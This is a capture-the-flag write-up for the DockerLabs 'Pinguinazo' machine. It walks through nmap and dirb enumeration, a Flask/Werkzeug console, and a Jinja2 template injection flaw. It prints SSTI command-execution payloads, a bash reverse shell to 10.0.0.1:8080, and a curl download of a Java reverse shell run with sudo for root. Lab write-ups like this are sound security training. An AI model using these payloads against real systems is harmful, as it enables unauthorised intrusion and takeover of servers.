# Pinguinazo

<center><img src="https://dockerlabs.es/static/images/logos/logo.png" width="150px"></center>

## Contents

- [Reconnaissance](#reconnaissance)
- [Scanning](#scanning)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Privilege Escalation](#privilege-escalation)

## Reconnaissance

The target machine is correctly deployed inside the lab network (in this case, using Docker).  
To identify it, `arp-scan` was used to find devices on our docker network using the `docker0` interface

```bash
sudo arp-scan -I docker0 --localnet
Interface: docker0, type: EN10MB, MAC: 02:42:77:20:48:b6, IPv4: 172.17.0.1
Starting arp-scan 1.10.0 with 65536 hosts (https://github.com/royhills/arp-scan)
172.17.0.2	02:42:ac:11:00:02	(Unknown: locally administered)
```

## Scanning

An **Nmap** scan was performed to identify open ports and services:

```bash
nmap -p- --open -sC -sV --min-rate 5000 -n -Pn 172.17.0.2
```

The **target** corresponds to the victim machine IP: **172.17.0.2**

Main findings:

- Port **5000** open.
- Service running: Python application with **Flask** and references to **Werkzeug**.

![Scan1](https://i.imgur.com/6UnWPSU.png)  
![Scan2](https://i.imgur.com/fZBZZWQ.png)

The target MAC address was also observed.

## Enumeration

The next step was to look for hidden directories and resources.

Using **Gobuster**:

```bash
gobuster dir -u "http://172.17.0.2"   -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt   -t 20 -x php,txt,html,php.bak
```

Results were limited, so **dirb** was used and it revealed an interesting resource:

![Dirb](https://i.imgur.com/FrTLh5h.png)

`/console` was identified, corresponding to the **Werkzeug interactive console**.  
Sensitive data such as the application **SECRET** was found in the web source code — likely used to generate the access PIN.

![Werkzeug1](https://i.imgur.com/qZt5KIJ.png)  
![Werkzeug2](https://i.imgur.com/C0b9r7G.png)

Additionally, the main page contained a very basic form with the following weaknesses:

- Email input in _readOnly_ mode (admin email exposed).
- Inputs without validation (not required).
- The name field seems to be used directly as a parameter in template rendering.

![Form1](https://i.imgur.com/KI8LbEo.png)  
![Form2](https://i.imgur.com/hekE1S3.png)

## Exploitation

Two paths were considered:

1. **Bypass the Werkzeug PIN**

   - Based on parameters such as:
     - The user running the app.
     - The application SECRET.
     - The machine MAC address.
   - Scripts exist to generate possible PINs but they require time and multiple valid attempts.

   ![Werkzeug Bypass](https://i.imgur.com/igjHHlp.png)

2. **Exploit the main form**  
   Template injection tests were performed:

   - **XSS**: `<script>alert('pwned');</script>`
   - **SSTI**: `{{ 2 * 8 }}`

   SSTI worked, confirming a template rendering vulnerability.

![SSTI1](https://i.imgur.com/naclOMB.png)  
![SSTI2](https://i.imgur.com/0B2VOOy.png)

Example payload executing system commands:

```jinja
{{ config.__init__.__globals__['os'].popen('whoami').read() }}
```

Using Burp Suite (Repeater) we tested reading `/etc/passwd`:

![passwd1](https://i.imgur.com/rEyQTRG.png)  
![passwd2](https://i.imgur.com/aTAu5Gd.png)

It became clear that SSTI exploitation was more direct and effective.

### Reverse Shell

A reverse shell attempt was made via SSTI. The successful payload was:

```jinja
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen(
  'bash -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"').read() }}
```

**Pre-requisites**:

- Define the listening IP and port.
- Start the listener with:
  ```bash
  nc -lvnp 8080
  ```

![ReverseShell1](https://i.imgur.com/UZWpEfu.png)  
![ReverseShell2](https://i.imgur.com/QNAHOy2.png)

This provided initial terminal access.

## Privilege Escalation

Searched for SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

![SUID](https://i.imgur.com/3B74T7F.png)

Although some binaries weren’t directly exploitable, `/usr/bin/sudo` appeared in the list.  
Running:

```bash
sudo -l
```

revealed that Java could be run as root.

![SudoJava](https://i.imgur.com/nnztH1C.png)

The plan was to execute a reverse shell with sudo to obtain root privileges. A small HTTP server was used on the attacker machine:

```bash
python3 -m http.server PORT
```

Then on the victim:

```bash
curl -O http://10.0.0.1:PORT/magic_shell.java
sudo java magic_shell.java
```

Despite warnings, running the Java program with sudo resulted in a root shell.

![SudoJava](https://i.imgur.com/lgH3sZ1.png)

## ![SudoJava](https://i.imgur.com/wVFMqtT.png)

_Written by **kur0bai**_
